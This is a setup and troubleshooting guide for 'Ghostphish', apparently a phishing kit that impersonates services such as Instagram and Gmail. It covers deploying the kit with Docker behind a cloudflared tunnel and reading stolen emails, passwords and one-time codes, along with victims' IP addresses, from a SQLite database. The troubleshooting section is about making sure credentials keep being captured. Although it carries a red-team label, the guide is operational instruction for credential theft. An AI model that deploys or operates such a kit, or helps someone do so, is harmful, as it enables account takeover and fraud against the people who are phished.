# Ghostphish Setup Guide

## Quick Start

### 1. Clone & Initialize (First Time)
```bash
git clone https://github.com/Yaman-RedTeam/ghostphish.git
cd ghostphish

# Initialize data directory & database
./init.sh
```

### 2. Run in Docker
```bash
docker-compose up -d

# Verify status
docker logs ghostphish
```

### 3. Check Captures
```bash
# View captured credentials
sqlite3 data/captures.db "SELECT * FROM captures;"

# Or use export script
python3 export_captures.py
```

---

## Troubleshooting

### Issue: "ls data/ shows nothing"
**Solution:** Run `./init.sh` to initialize the data directory and database.

```bash
./init.sh
ls -la data/
# Should now show captures.db
```

### Issue: "Credentials not being captured"

**Check 1: Database exists?**
```bash
ls -la data/captures.db
```

**Check 2: Database is writable?**
```bash
chmod 666 data/captures.db
```

**Check 3: App logs**
```bash
docker logs ghostphish | tail -20
```

**Check 4: Manual test**
```bash
sqlite3 data/captures.db
sqlite> SELECT COUNT(*) FROM captures;
```

### Issue: "Termux specific - permissions denied"

If running in Termux with mounted volumes:
```bash
# Ensure proper permissions
chmod 755 data/
chmod 666 data/*.db

# Or export data directory path
export GHOSTPHISH_DATA=/path/to/data
docker-compose up -d
```

---

## Environment Variables

- `GHOSTPHISH_DATA` — Override data directory path
  ```bash
  export GHOSTPHISH_DATA=/home/redteam/ghostphish/data
  docker-compose up -d
  ```

---

## Database Schema

```sql
captures table:
- id (INTEGER PRIMARY KEY)
- timestamp (TEXT)
- service (TEXT) — e.g., "instagram", "gmail"
- email (TEXT)
- password (TEXT)
- otp (TEXT)
- honeypot (TEXT) — anti-bot field
- ip_address (TEXT)
- user_agent (TEXT)
- referer (TEXT)
- attempt_number (INTEGER) — retry count for same email
```

---

## Important Notes

- ✅ Captures are **logged to SQLite** (`data/captures.db`)
- ✅ All submissions are **timestamped** with IP/UA/referer
- ✅ **Honeypot detection** — bot submissions still logged separately
- ✅ **Cloudflared tunnel** — quick-tunnel URL changes on restart
  - Use `./tunnel-persistent.sh url` to get current tunnel URL
